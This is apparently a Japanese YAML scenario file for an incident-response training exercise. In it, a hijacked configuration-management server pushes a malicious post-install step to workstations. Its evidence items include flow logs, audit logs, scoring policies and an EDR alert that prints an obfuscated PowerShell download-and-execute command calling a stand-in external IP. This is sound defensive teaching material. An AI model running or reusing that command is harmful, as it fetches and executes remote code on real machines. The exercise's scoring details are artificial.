@@ -1,0 +1,2251 @@
+schema_version: "0.4"
+
+meta:
+  id: software-distribution-spread-01
+  title: "配られていく更新"
+  version: "1.0.0"
+  author: "IR Dojo"
+  license: "CC-BY-4.0"
+  estimated_play_minutes: 10
+  language: ja
+  default_policy: spread_containment
+  default_assist_level: assisted
+  briefing: |
+    11:20、監視センターから連絡。設計部の端末 ws-eng01 で、
+    難読化されたスクリプトが起動したことを EDR が検知した。
+    あなたは情報システム部のインシデント対応担当として呼ばれた。
+
+    拠点の管理対象は 7 台。平日の日中帯で、利用者はそれぞれ席にいる。
+    監視センターからの一次情報は「ws-eng01 でスクリプトが走った」のみである。
+  tags: [distribution, spread, misleading-evidence]
+
+world:
+  assets:
+    # `aliases` は置いていない。資料もコマンド行も id で呼んでおり、
+    # label から作れる名前で足りている。資料の側で呼び方を増やしたら、
+    # ここにも宣言を足すこと（SPEC 5.2 / v1.45）。見ているのは
+    # test_every_asset_a_piece_of_evidence_points_at_is_named_in_it
+    - id: dist01
+      label: "構成管理サーバ"
+      criticality: critical
+      depends_on: [repo01]
+      # 全端末への更新配信と設定適用がここで止まる。
+      # 止めると拠点全体の保守作業が丸ごと止まる
+      business_impact_per_hour: 60
+
+    - id: repo01
+      label: "パッケージ保管庫"
+      criticality: high
+      depends_on: []
+      # 配信の材料置き場。止めると新しい版が作れなくなる
+      business_impact_per_hour: 16
+
+    - id: mgmt01
+      label: "運用作業端末"
+      criticality: medium
+      # **dist01 にぶら下げていない。** ぶら下げると、保管庫を止めた
+      # だけで無実の資産が2つ巻き込まれ、「無実の資産を止める代価」が
+      # 8.3 の帯（0.5〜1.5点）を突き抜ける（実測 2.67点）
+      depends_on: []
+      # 運用チームの作業台。止めると当日の運用作業が全部止まる
+      business_impact_per_hour: 14
+
+    - id: ws-eng01
+      label: "設計部端末 (橋本)"
+      criticality: medium
+      depends_on: []
+      # 設計部の検証担当。図面の確認作業が止まる
+      business_impact_per_hour: 13
+
+    - id: ws-acct
+      label: "経理部端末 (真下)"
+      criticality: low
+      depends_on: []
+      # 支払処理の締切が近い。止めるとその日の支払が止まる
+      business_impact_per_hour: 10
+
+    - id: ws-sales
+      label: "営業部端末 (小松)"
+      criticality: low
+      depends_on: []
+      # 受注の入力担当。止めると当日分の受注処理が滞る
+      business_impact_per_hour: 9
+
+    - id: ws-lobby
+      label: "受付の共用端末"
+      criticality: low
+      depends_on: []
+      # 誰の担当でもない共用機。止まるのは来客表示だけ
+      business_impact_per_hour: 3
+
+  ground_truth:
+    patient_zero: dist01
+    # **開始時点の**侵害資産である（SPEC 5.2）。この盤面は演習中に増える
+    compromised: [dist01, ws-eng01]
+    persistence: [ws-eng01]
+    innocent: [repo01, mgmt01, ws-lobby]
+    # **この盤面だけが持つもの。** 1本目・2本目の真実は執筆時に固定で、
+    # timeline は圧力しか運ばなかった。ここでは、配る仕組みを攻撃者が
+    # 握っているので、調べている間も配られ続ける。
+    #
+    # 配り元（dist01）を止めてあれば、その窓では何も配られない。
+    # **学習者の不作為が原因でしか広がらない形にしてある** —
+    # 3方針のどれで最良に解いても、dist01 が止まるのは 120分より前で、
+    # 最初の窓（240分）までに 120分の余裕がある。
+    #
+    # repo01 を止めても配信は止まらない。次の版が作れなくなるだけで、
+    # 配る分は dist01 の側に既に置かれている。「根を落とせば全部止まる」を
+    # この盤面で試すと、業務だけが止まって配信は続く
+    spreads:
+      - id: sp_ring_sales
+        to: ws-sales
+        at_minutes: 270
+        unless_contained: [dist01]
+        reveals: [ev_ring_sales]
+      # 2つ目の窓は、**判断を下したあとに開く位置**に置いてある。
+      # 判定した時点では正しかった名指しが、止める場所を間違えている間に
+      # 古くなる — 事実認識層（判定時点で測る）と封じ込めの完全度
+      # （終了時点で測る）が別々の数を見ていることが、ここで初めて読める
+      - id: sp_ring_acct
+        to: ws-acct
+        at_minutes: 380
+        unless_contained: [dist01]
+        reveals: [ev_ring_acct]
+    attack_narrative: |
+      4/9 10:41、攻撃者が dist01 の管理コンソールへ、保守用の共有アカウントで
+      外部からログインした。この口は多要素認証の対象外に置かれたままで、
+      同じ資格情報が委託先との作業手順書に載っていた。
+
+      10:52、攻撃者は配信ジョブの「導入後に走らせる処理」を書き換えた。
+      パッケージ本体には一切触れていない。repo01 に置かれた版も、
+      その署名も、最初から最後まで正しいままである。攻撃者が触ったのは
+      パッケージの外側、dist01 が持っているジョブの定義だけだった。
+
+      11:05、ring-1（検証）へ配信が走り、ws-eng01 に入った。
+      11:12、導入後処理として難読化スクリプトが起動し、
+      11:13 に常駐タスクが登録され、11:16 から外部へ接続を始めた。
+      ws-eng01 は端末を再起動しても同じところへ戻る状態にある。
+
+      配信計画は ring-1 の後に ring-2（営業）13:50、ring-3（経理）16:20 と
+      続く。dist01 を止めない限り、この2つの窓は予定どおり開く。
+      演習中に ws-sales と ws-acct が侵害されるとしたら、それは
+      攻撃者が新たに動いたからではなく、配る仕組みが動き続けたからである。
+
+      11:00 に ws-lobby と ws-eng01 が同じ形の通信を同時に出しているのは、
+      配布エージェントが毎正時に dist01 へ問い合わせる標準の動作による。
+      全端末が同じ時刻に同じ宛先へ話す。2台が同じ挙動をしていたのは、
+      片方がもう片方を叩いたからではなく、同じ仕組みがそうさせたからである。
+      ws-lobby は攻撃とは無関係。
+
+      10:35 に mgmt01 から dist01 へ集中していた特権操作は、
+      承認済みの定例メンテナンス (CHG-2026-0412) である。攻撃とは無関係。
+
+policies:
+  - id: business_continuity
+    label: "業務継続最優先"
+    briefing: |
+      経営判断により、拠点の基幹サービスの停止は最終手段とする。
+      封じ込めは業務影響を最小化する形で実施すること。
+      証拠保全は可能な範囲で行えばよい。
+
+      基幹資産（dist01 / repo01）を止める場合は、
+      その資産が侵害されている根拠を示せる状態であること。
+
+      全社へ一斉に手を止めさせる連絡は出さないこと。
+    weights:
+      business_impact:          0.40
+      total_damage:             0.25
+      containment_completeness: 0.25
+      evidence_preserved:       0.10
+    constraints:
+      - type: forbid_containment_without_evidence
+        assets: [dist01, repo01]
+        message: "証拠なしに基幹資産を停止することは方針違反です"
+      # 全社に「今の状態を変えるな」と流すことは、その日の作業を
+      # 止めることと同じである。証拠は残るが、仕事は止まる
+      - type: forbid_action
+        action_ids: [act_hold_notice]
+        message: "全社への現状維持の周知は、その日の業務を止めます"
+
+  - id: evidence_preservation
+    label: "証拠保全最優先"
+    briefing: |
+      委託先との契約上、経緯の説明責任があり、証拠保全を最優先とする。
+      揮発性証拠の確保を封じ込めに先行させること。
+
+      止める資産ごとに、その資産から稼働中の状態を取ってから止めること。
+      別の資産で取れていることは、この要件を満たさない。
+
+      配信を外から塞ぐだけにしないこと。塞いでも中の処理は回り続け、
+      記録は上書きされ続ける。電源も落とさないこと。
+      端末を作り直すのも、その端末に残っているものごと消す行為である。
+    # 名乗りの順序と重みの順序を一致させる（SPEC 5.3）。この方針は
+    # ブリーフィングで業務継続について何も約束していないので、
+    # 業務影響は最も軽い。**重みを下げた分は完全度へ回す** —
+    # 実測で「何も止めないプレイ」が最良の組に 9点差まで迫っており、
+    # 保全だけを見る方針は「何もしない」を褒めかねない
+    weights:
+      evidence_preserved:       0.50
+      containment_completeness: 0.30
+      total_damage:             0.15
+      business_impact:          0.05
+    constraints:
+      # `require_before` ではこの方針は成立しない（v1.40）。
+      # 盤面のどこか1つで揮発性を取れば済むので、dist01 を無条件に
+      # 落とせるようになり、業務継続最優先の複製になる
+      - type: require_capture_of_target
+        action_type: contain
+        prerequisite_tags: [volatile_capture]
+        message: "止める資産の稼働中の状態を、止める前に取っていません"
+      - type: forbid_action
+        action_ids: [act_block_dist_edge, act_shutdown_dist01, act_rebuild_eng01]
+        message: "外から塞ぐだけにも、電源を落としても、作り直してもいけません"
+
+  - id: spread_containment
+    label: "拡散阻止最優先"
+    briefing: |
+      これ以上配られることの阻止を最優先とする。
+      業務影響および証拠保全は二次的な考慮事項とする。
+
+      止めるべきものは、根拠が固まる前でも止めてよい。
+      半端な塞ぎ方で凌がず、配る側そのものを確実に落とすこと。
+      端末に残っているものも、登録を戻すだけで済ませないこと。
+    weights:
+      total_damage:             0.50
+      containment_completeness: 0.30
+      business_impact:          0.10
+      evidence_preserved:       0.10
+    constraints:
+      # 境界で塞いでも内側の配信経路は残り、サービスを止めても
+      # ジョブの定義と資格情報はそのまま残る。どちらもこの方針では
+      # 「半端な塞ぎ方」にあたる（ブリーフィングの地の文が根拠）
+      - type: forbid_action
+        action_ids: [act_block_dist_edge, act_stop_dist_service]
+        message: "外から塞いでも、サービスを止めても、配る側は生きています"
+      # 登録を戻すだけの除去は、見えていない場所に残った分を取りこぼしうる。
+      # 丁寧なほうが高くつくのは dist01 の3手と同じ形で、
+      # この方針だけが「安くて確実なほう」を選ばされる
+      - type: forbid_action
+        action_ids: [act_purge_eng01]
+        message: "登録を戻すだけでは取りこぼしうる。この方針では作り直すこと"
+
+evidence:
+  - id: ev_eng_child
+    points_to: [ws-eng01]
+    misleading: false
+    plausibility: high
+    volatile: false
+    occurred_at: "2026-04-09 11:12"
+    summary: "ws-eng01 で、配布エージェントの子として難読化スクリプトが起動している"
+    reading: |
+      EDR の検知詳細。ProcessTree は、検知した実行体から親をたどった並びである。
+      いちばん下が検知対象で、上へ行くほど先に起動したものを指す。
+
+      コマンドラインの各オプション:
+        -nop   プロファイルスクリプトを読み込まない
+        -w hidden  ウィンドウを表示しない
+        -enc   続く文字列が Base64 (UTF-16LE) であることを示す
+
+      SQBOAFYA... をデコードすると次になる:
+        INVOKE-EXPRESSION (IWR -UseB 'http://203.0.113.24/u.txt')
+
+      IWR は Invoke-WebRequest の別名で、-UseB は UseBasicParsing の略。
+      取得した文字列をその場で実行する形である。
+
+      Integrity は実行時の権限水準を指す。System は最も高い水準で、
+      サービスとして動いているものがこの水準を持つ。
+    possibilities:
+      - |-
+        配る仕組みが、手順に書かれたとおりの処理を走らせた。
+        その手順に何が書かれていたかで分かれる
+      - |-
+        利用者が受け取った案内を、自分の手で貼り付けて動かした。
+        本人がその時刻に何をしたかで分かれる
+      - |-
+        以前から入っていたものが、この時刻にたまたま動いた。
+        いつ入ったものなのかを見れば分かれる
+    content: |
+      # EDR 検知詳細 / alert-2026-0409-0037
+
+      Host        : WS-ENG01.corp.local
+      DetectedAt  : 2026-04-09T11:12:41+09:00
+      Severity    : High
+      Rule        : Obfuscated script execution
+
+      ProcessTree :
+        C:\Program Files\CfgAgent\cfgagentsvc.exe   (Integrity: System)
+          C:\Windows\System32\cmd.exe  /c ".\post-install.cmd"
+            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+              -nop -w hidden -enc SQBOAFYATwBLAEUALQBFAFgAUABSAEUAUwBTAEkA
+              TwBOACAAKABJAFcAUgAgAC0AVQBzAGUAQgAgACcAaAB0AHQAcAA6AC8ALwAy
+              ADAAMwAuADAALgAxADEAMwAuADIANAAvAHUALgB0AHgAdAAnACkA
+
+      収集範囲 : EDR が保持している実行イベント（検知前後 30分）
+      非対象   : 端末のローカルにしか残らない記録、EDR 導入前の実行
+
+  # **共通原因型の誤導**（SPEC 3.4 の型の表）。2台が同じ時刻に同じ形の
+  # 通信を出しているので、片方がもう片方を叩いたように読める。
+  # 実際には、同じ仕組みが両方にそうさせているだけである。
+  # この型は1本目・2本目には無い（1本目は時刻の近さと向きの取り違え、
+  # 2本目は利用実績の比較）。棄却できるのは、その仕組みの標準動作を
+  # 知るか、もう一方の端末を見に行くかのどちらかである
+  - id: ev_agent_beacon
+    points_to: [ws-lobby]
+    misleading: true
+    plausibility: high
+    volatile: false
+    occurred_at: "2026-04-09 11:00"
+    refuted_by: [ev_agent_policy, ev_lobby_live]
+    summary: "ws-lobby と ws-eng01 が 11:00 に、同じ宛先へ同じ形の通信を出している"
+    reading: |
+      フロー情報の各列は「時刻 送信元 → 宛先:ポート バイト数 継続時間 ja3」。
+
+      ja3 は TLS のクライアント側の挨拶の仕方を並べて要約した指紋である。
+      同じソフトウェアの同じ版なら、どの端末から出ても同じ値になる。
+      逆に言うと、値が同じことが分かるのは「同じものが話している」までで、
+      どちらが先に話しかけたかは、この指紋からは出てこない。
+
+      bytes_out が三桁の通信は、中身のあるやり取りではなく、
+      問い合わせと短い応答の往復であることが多い。
+
+      192.0.2.0/24 は拠点内のアドレス帯である。
+    possibilities:
+      - |-
+        同じ仕組みが両方に入っていて、揃った時刻に外へ出た。
+        その仕組みの決まった動きを見れば分かれる
+      - |-
+        片方に入ったものが、もう片方へ同じものを送り込んだ。
+        送り込んだ側の記録が残っているかで分かれる
+      - |-
+        たまたま同じ時刻に、別々の理由で外へ出ただけだった。
+        それぞれの端末の側で何が動いたかで分かれる
+    content: |
+      # コアスイッチのフロー情報 / 2026-04-09 10:00-11:20
+
+      11:00:02  192.0.2.61 (WS-LOBBY) → 192.0.2.10:8443  bytes_out=412  dur=0.9s  ja3=51c64c77e6
+      11:00:02  192.0.2.44 (WS-ENG01) → 192.0.2.10:8443  bytes_out=412  dur=0.8s  ja3=51c64c77e6
+      11:00:03  192.0.2.52 (WS-ACCT)  → 192.0.2.10:8443  bytes_out=412  dur=1.1s  ja3=51c64c77e6
+      10:00:02  192.0.2.61 (WS-LOBBY) → 192.0.2.10:8443  bytes_out=412  dur=0.9s  ja3=51c64c77e6
+      10:00:01  192.0.2.44 (WS-ENG01) → 192.0.2.10:8443  bytes_out=412  dur=0.8s  ja3=51c64c77e6
+
+      集計対象 : コアスイッチと境界を通過したフロー
+      非対象   : 同一セグメント内で完結し、コアを通らない通信
+
+  - id: ev_agent_policy
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "配布エージェントは全端末共通で、毎正時に配信元へ問い合わせる設定である"
+    reading: |
+      配布製品の運用手順書と、配られている共通設定の抜粋である。
+
+      PollInterval は問い合わせの間隔、PollAnchor はその起点を指す。
+      起点を正時に固定する設定では、全端末の問い合わせが同じ分に揃う。
+      間隔だけを決めて起点を決めない設定なら、端末ごとに時刻がばらける。
+
+      Ring は段階配信の区分で、どの端末がどの順番で受け取るかを表す。
+      同じ Ring の端末は同じ配信を同じ窓で受け取る。
+
+      手順書が書いているのは、この拠点でそう決めてあるという事実である。
+      当日そのとおりに動いたかどうかは、通信の側の記録に残る。
+    possibilities:
+      - |-
+        決めたとおりに、今も全端末で同じ動きをしている。
+        当日の通信が設定と合っているかで分かれる
+      - |-
+        設定は残っているが、動いている間隔はそれと違う。
+        端末側に入っている版と設定で分かれる
+      - |-
+        決めた動きに、別の何かが重なって出ている。
+        宛先と量が決めた枠に収まるかで分かれる
+    content: |
+      # 構成管理運用手順書 (rev.7) / 共通設定 cfgagent.policy より抜粋
+
+      [Agent]
+      PollInterval  = 3600          ; 秒
+      PollAnchor    = top-of-hour   ; 起点を正時に固定
+      Endpoint      = 192.0.2.10:8443
+      Transport     = TLS 1.3
+      Payload       = 問い合わせ 412 bytes 固定
+
+      [Rings]
+      ring-1 = 検証     (1 台)
+      ring-2 = 営業     (1 台)
+      ring-3 = 経理     (1 台)
+      ring-4 = 共用・予備 (1 台)
+
+      照会対象 : 配布製品の手順書と、配られている共通設定
+      非対象   : 各端末が実際にその設定で動いているかどうか
+
+  - id: ev_change_ticket
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "当日午前に、承認済みの定例メンテナンス作業が1件登録されている"
+    reading: |
+      変更管理台帳の1件分である。読む順は 種別 → 実施時間帯 → 実施者 → 対象。
+
+      「実施時間帯」は申請された枠であって、実際に手を動かした時刻とは
+      ずれることがある。作業記録の側に開始と終了が残るので、
+      台帳と突き合わせて読む。
+
+      「作業内容」に書かれた手順のうち、権限の昇格を伴うものがどれかは
+      手順書の側にある。台帳が書いているのは、その作業が承認されていた
+      という事実であって、その時間帯に起きたことの全部ではない。
+
+      承認者と実施者が別人であることは、この組織の通常の運用である。
+    possibilities:
+      - |-
+        申請どおりの作業が、申請どおりの時間帯に行われた。
+        作業記録の開始と終了が枠に収まるかで分かれる
+      - |-
+        申請は出ているが、当日は行われずに流れた。
+        実施の記録が残っているかどうかで分かれる
+      - |-
+        申請された作業と別の動きが、同じ枠に重なっている。
+        操作の中身が手順のどれに当たるかで分かれる
+    content: |
+      # 変更管理台帳 / 2026-04-09 分
+
+      CHG-2026-0412
+        種別       : 定例メンテナンス（月次）
+        実施時間帯 : 2026-04-09 10:20 - 11:00
+        申請者     : CORP\\ito     (情報システム部)
+        承認者     : CORP\\kubota  (情報システム部長)
+        実施者     : CORP\\ito
+        作業端末   : MGMT01
+        作業内容   : 配信履歴の棚卸し、保持期間の見直し、失敗ジョブの再投入
+
+      照会対象 : 承認済みの変更申請と、その実施記録の有無
+      非対象   : 申請されていない操作、申請の枠外で行われた操作
+
+  - id: ev_edr_scan
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "全端末のフルスキャンで、既知のシグネチャに当たるものは 0 件である"
+    reading: |
+      EDR のフルスキャンの結果一覧である。ホストごとに、走査した
+      ファイル数と検知件数が並ぶ。
+
+      検知は「定義ファイルに登録されている形」との照合で行われる。
+      定義ファイルの更新日時が古いと、新しい形は照合対象に入らない。
+      ここでは当日の朝に更新されている。
+
+      スキャンが見るのはディスク上に実体があるものである。
+      実体を置かずにメモリの中だけで完結する実行や、
+      正規の実行体が正規の引数で動いている形は、この観点では出てこない。
+
+      走査ファイル数が端末ごとに違うのは、入っているソフトウェアの
+      量の違いによる。
+    possibilities:
+      - |-
+        置かれているものの中に、登録済みの形が無かった。
+        別の観点で見たときに何が出るかで分かれる
+      - |-
+        置かれてはいるが、登録された形と少し違っていた。
+        実行の記録の側に何が残るかで分かれる
+      - |-
+        そもそも実体を置かない形で動いている。
+        稼働中の状態を見たときに何が出るかで分かれる
+    content: |
+      # edrctl scan --all --type full
+
+      DIST01     ........ done   0 detections   1,842,117 files
+      REPO01     ........ done   0 detections   2,910,448 files
+      MGMT01     ........ done   0 detections     704,225 files
+      WS-ENG01   ........ done   0 detections     612,809 files
+      WS-ACCT    ........ done   0 detections     588,301 files
+      WS-SALES   ........ done   0 detections     571,664 files
+      WS-LOBBY   ........ done   0 detections     402,955 files
+
+      Signature DB : 2026-04-09 07:40 (latest)
+      スキャン範囲 : 全ドライブ / アーカイブ内も展開
+      非対象       : メモリ内で完結する実行、正規の実行体が正規の引数で
+                     動いている形、定義に未登録のもの
+
+  - id: ev_backup_state
+    points_to: []
+    misleading: false
+    plausibility: low
+    volatile: false
+    summary: "配信サーバと保管庫のバックアップは健全で、当日朝の世代から復元できる"
+    reading: |
+      バックアップ製品の世代一覧と、復元試験の結果である。
+
+      「世代」は取得した時点ごとの控えを指す。保持数の上限に達すると、
+      古いものから順に落ちていく。上限と現在の本数を見ておくと、
+      あと何日ぶん遡れるかが分かる。
+
+      検証復元は、控えから実際に書き戻して中身が読めるかを確かめる作業で、
+      控えが壊れていないことの確認にあたる。控えの中身がいつの時点の
+      ものかは、取得時刻の側を見る。
+
+      復元できることと、戻したものが安全であることは別の話で、
+      後者は控えを取った時点に何が入っていたかによる。
+    possibilities:
+      - |-
+        控えは健全で、必要なら朝の状態まで戻せる。
+        戻したい時点が保持の範囲に入るかで分かれる
+      - |-
+        控えは取れているが、中身は既に変わった後である。
+        取得時刻と、変わった時刻の前後で分かれる
+      - |-
+        控えそのものに手が入っている可能性が残る。
+        控え置き場への書き込み記録で分かれる
+    content: |
+      # bkpctl status --set corp-daily
+
+      世代       : 14 / 14 (保持上限)
+      最古       : 2026-03-27 02:00
+      最新       : 2026-04-09 02:00
+      対象       : DIST01 (システム/ジョブ定義), REPO01 (パッケージ領域)
+
+      # bkpctl restore --generation 2026-04-09T02:00 --to /mnt/verify --limit 50
+        50 items restored ... OK
+        checksum verified
+
+      検証範囲 : 最新世代からの抽出復元 50 件
+      非対象   : 控えを取った時点より後に起きたこと
+
+  # **誤導その2。** 昼前に管理者権限の操作が集中しているので、
+  # そこから配信の仕組みが触られたように読める。
+  # 実際には承認済みの定例作業で、棄却材料は台帳とその端末自身の2つある
+  - id: ev_mgmt_privileged
+    points_to: [mgmt01]
+    misleading: true
+    plausibility: medium
+    volatile: false
+    occurred_at: "2026-04-09 10:35"
+    refuted_by: [ev_change_ticket, ev_mgmt_local]
+    summary: "mgmt01 から dist01 へ、昼前に管理者権限の操作が 63 件集中している"
+    reading: |
+      構成管理サーバ側の監査ログである。各行は
+      「時刻 主体 操作 対象 結果」の順に並ぶ。
+
+      Elevated は、その操作が権限を昇格させた状態で行われたことを示す。
+      配信の仕組みを触る操作は、ほぼすべてこの状態を要求する。
+
+      Source は操作が行われた端末で、Actor はその操作を行ったアカウントを
+      指す。どちらも操作を受けた側が記録した値である。
+
+      件数の多さそのものは、まとめて処理する作業でも、一つずつ試す作業でも
+      同じように増える。何をしたかは操作名の側に出る。
+    possibilities:
+      - |-
+        決められた手順の作業が、まとめて実行された。
+        その時間帯に何が予定されていたかで分かれる
+      - |-
+        誰かがその端末を借りて、別の操作を行った。
+        操作の中身が手順に載っているかで分かれる
+      - |-
+        その端末そのものが、外から使われていた。
+        端末の側に何が残っているかで分かれる
+    content: |
+      # dist01 監査ログ / 2026-04-09 10:00-11:20
+
+      10:35:04  CORP\\ito  job.history.purge   retention=90d   OK   Source=MGMT01  Elevated
+      10:35:11  CORP\\ito  job.retry           job=win-base    OK   Source=MGMT01  Elevated
+      10:35:19  CORP\\ito  job.retry           job=office-doc  OK   Source=MGMT01  Elevated
+      10:36:02  CORP\\ito  ring.list                           OK   Source=MGMT01  Elevated
+      ...
+      10:35:04 - 10:58:47 の間に 63 件 (すべて Source=MGMT01)
+
+      集計対象 : 権限を昇格させた操作
+      非対象   : 昇格を伴わない参照操作
+
+  - id: ev_mgmt_local
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    summary: "mgmt01 の自動起動と実行履歴は標準構成と一致する"
+    reading: |
+      端末の一括収集ツールの結果である。autoruns は自動起動の登録、
+      shimcache は過去に実行された実行体の並び、tasks は登録された
+      定期実行を指す。
+
+      baseline は、この組織が配っている標準構成の控えである。
+      差分 0 は、収集した項目が控えと同じ並びだったことを表す。
+
+      収集しているのは、その端末のディスク上に登録として残っているもので
+      ある。稼働中のメモリの中身や、登録を伴わずに一度だけ動いたものは、
+      この観点には出てこない。
+
+      利用者の操作履歴は、本人のプロファイル配下に別途残る。
+    possibilities:
+      - |-
+        登録として残るものは、配った控えと同じ並びだった。
+        別の観点で見たときに何が出るかで分かれる
+      - |-
+        登録を伴わない形で、一度だけ何かが動いた。
+        実行の記録の側に何が残るかで分かれる
+      - |-
+        控えの側が、既に変わった後の姿を写している。
+        控えを取った時刻と、変わった時刻で分かれる
+    content: |
+      # irtriage.exe --host MGMT01 --collect autoruns,shimcache,tasks
+
+      autoruns    : 27 entries   baseline diff: 0
+      shimcache   : 418 entries  baseline diff: 0
+      tasks       : 66 entries   baseline diff: 0
+      profile     : CORP\\ito  最終対話ログオン 2026-04-09 08:52
+
+      収集範囲 : ディスク上に登録として残っている項目
+      非対象   : 稼働中のメモリの中身、登録を伴わない一度きりの実行
+
+  - id: ev_lobby_live
+    points_to: []
+    misleading: false
+    plausibility: medium
+    volatile: false
+    occurred_at: "2026-04-02 09:05"
+    summary: "ws-lobby に入っている版は前回配信のままで、導入後の処理は走っていない"
+    reading: |
+      端末のところまで行って、動かしたまま採取した結果である。
+
+      InstalledVersion は現在入っている版、InstalledAt はそれが入った時刻、
+      Ring はその端末が属する配信の区分を指す。次の配信を受け取るまで、
+      この3つは前回の値のまま動かない。
+
+      PostInstallLog は、導入のたびに追記される作業記録である。
+      追記の最終行の時刻と、入っている版の導入時刻が揃っていれば、
+      その版が入ったとき以降に導入の処理は走っていないことになる。
+
+      稼働中のプロセス一覧と接続一覧は、採取した瞬間の姿である。
+      採取より前に終了したものは、ここには並ばない。
+    possibilities:
+      - |-
+        前の配信のまま据え置かれ、その後は何も入っていない。
+        次の配信の窓がいつ開くかで先が分かれる
+      - |-
+        入ってはいるが、記録に残らない形で行われた。
+        記録の書き方と実行の記録の突き合わせで分かれる
+      - |-
+        入った後に、記録ごと片付けられている。
+        記録の連番や欠けの有無で分かれる
+    content: |
+      # 09:4x 現地着。端末は電源が入ったまま
+      # cfgagentctl status --local
+
+      InstalledVersion : pdfview 4.2.1
+      InstalledAt      : 2026-04-02 09:05:22
+      Ring             : ring-4
+      LastPoll         : 2026-04-09 11:00:02   result=no-assignment
+
+      # tail -3 C:\ProgramData\CfgAgent\post-install.log
+        2026-04-02 09:05:22  begin  pdfview 4.2.1
+        2026-04-02 09:05:31  step   register shortcut
+        2026-04-02 09:05:33  end    rc=0
+
+      取得範囲 : 稼働中のプロセス・接続一覧と、端末上の導入記録
+      非対象   : 採取より前に終了したプロセス
+
+  # **`clears` 型の誤導**（SPEC 3.4）。資料そのものは正しく、嘘は無い。
+  # 誤っているのは読み手の一般化で、署名が正しいことは
+  # 「配る仕組み全体が触られていない」を意味しない。
+  # 資料自身が検証範囲と非対象を平文で書いているので、罠は
+  # 情報の罠ではなく注意の罠である（5.4 の解き方と同じ）
+  - id: ev_pkg_signature
+    points_to: []
+    clears: [dist01]
+    misleading: true
+    plausibility: high
+    volatile: false
+    refuted_by: [ev_job_definition, ev_dist_live]
+    summary: "dist01 と repo01 の全パッケージについて、署名検証は全件一致する"
+    reading: |
+      パッケージ署名の検証結果である。各行は
+      「パッケージ名 版 署名者 検証結果」の順に並ぶ。
+
+      署名が検証するのは、署名を付けた時点のパッケージの中身が
+      その後で変わっていないことである。何が署名されているかは
+      製品によって違い、対象の範囲は検証ツールが自分で書いている。
+
+      thumbprint は署名に使われた鍵の指紋で、組織内で発行した鍵なら
+      全パッケージで同じ値になる。値が揃っていることは、同じ鍵で
+      署名されていることを表す。
+
+      配信の仕組みは、パッケージ本体のほかに、いつ・誰に配るかと、
+      入れる前後に何をするかを別に持っている。
+    possibilities:
+      - |-
+        検証した範囲について、中身は署名した時のままである。
+        範囲の外に何が置かれているかで分かれる
+      - |-
+        中身は変わっているが、鍵ごと使われて署名が付け直された。
+        鍵の発行と利用の記録の側で分かれる
+      - |-
+        中身も鍵も正しく、触られたのは別の場所である。
+        その別の場所に変更の記録があるかで分かれる
+    content: |
+      # pkgctl verify --all --source repo01 --cache dist01
+
+      pdfview      4.2.2  CORP Internal Signing CA  OK
+      pdfview      4.2.1  CORP Internal Signing CA  OK
+      win-base     11.7   CORP Internal Signing CA  OK
+      office-doc   3.4.0  CORP Internal Signing CA  OK
+      ... 全 48 パッケージ
+
+      Result       : 48 verified / 0 mismatch
+      thumbprint   : すべて 9F2C4A18D0B7E5 (組織内発行)
+
+      検証範囲 : パッケージ本体と、その署名
+      非対象   : 配信ジョブの定義、導入の前後に走らせる処理の記述
+
+  - id: ev_console_login
+    points_to: [dist01]
+    misleading: false
+    plausibility: high
+    volatile: false
+    occurred_at: "2026-04-09 10:41"
+    summary: "dist01 の管理コンソールへ、外部アドレスから保守用アカウントで入られている"
+    reading: |
+      管理コンソールのログインの記録である。各行は
+      「時刻 アカウント 接続元 認証方式 結果」の順に並ぶ。
+
+      MFA の列は多要素認証を通ったかどうかを指す。exempt は
+      その口が対象外に設定されていることを表し、認証が失敗したのではなく
+      最初から求められていない状態である。
+
+      接続元が 192.0.2.0/24 の外にあるものは、拠点の外から来ている。
+      保守用の口を外向きに開けたままにしておく運用は珍しくない。
+
+      「保守用の共有アカウント」は、一人の利用者に紐づかない口である。
+      誰が使ったかは、この記録だけでは決まらない。
+    possibilities:
+      - |-
+        契約している委託先が、いつもどおり保守で入ってきた。
+        その時間帯の作業予定と合うかで分かれる
+      - |-
+        同じ口の資格情報が、外へ渡っていて使われた。
+        その資格情報がどこに書かれていたかで分かれる
+      - |-
+        利用者の誰かが、外から自分の判断で入った。
+        本人の申告と接続元の住所で分かれる
+    content: |
+      # dist01 コンソール認証ログ / 2026-04-09
+
+      09:12:40  CORP\\ito       192.0.2.31    password+MFA   success
+      10:41:08  CORP\\svc-maint 203.0.113.24  password       success   MFA=exempt
+      10:41:09  CORP\\svc-maint 203.0.113.24  session open   console
+      11:03:55  CORP\\svc-maint 203.0.113.24  session close
+
+      収集範囲 : 管理コンソールへのログインとセッションの開閉
+      非対象   : API 経由の呼び出し、ログイン後に行われた個別の操作
+
+  - id: ev_job_definition
+    points_to: [dist01]
+    misleading: false
+    plausibility: high
+    volatile: false
+    occurred_at: "2026-04-09 10:52"
+    summary: "配信ジョブの導入後処理が 10:52 に書き換えられ、実行行が1行増えている"
+    reading: |
+      配信ジョブの定義と、その変更履歴である。
+
+      ジョブの定義は「何を」「誰に」「いつ」「入れる前後に何をするか」の
+      4つを持つ。パッケージ本体は「何を」にあたり、署名はそこに付く。
+      「入れる前後に何をするか」は定義の側に文字列として書かれ、
+      パッケージの署名の対象には入らない。
+
+      diff の行頭の + は、その版で追加された行を指す。
+      版番号 (rev) は定義を保存するたびに1つ上がる。
+
+      Author は定義を保存したアカウント、SavedFrom は保存が行われた
+      接続元である。
+    possibilities:
+      - |-
+        運用の担当者が、手順の改善として1行足した。
+        その変更が申請に載っているかで分かれる
+      - |-
+        別の誰かが、同じ口を使って1行足した。
+        保存したときの接続元と時刻で分かれる
+      - |-
+        元から入っていた行が、今回たまたま目に付いた。
+        変更履歴のどの版から在るかで分かれる
+    content: |
+      # dist01 / jobctl show --job pdfview-4.2.2 --history
+
+      rev 8  2026-04-06 14:20  Author=CORP\\ito        SavedFrom=192.0.2.31
+      rev 9  2026-04-09 10:52  Author=CORP\\svc-maint  SavedFrom=203.0.113.24
+
+      # jobctl diff --job pdfview-4.2.2 --rev 8..9
+        [post-install]
+          cmd = pdfview-postcfg.cmd
+      +   cmd = post-install.cmd
+
+      # type post-install.cmd
+        @echo off
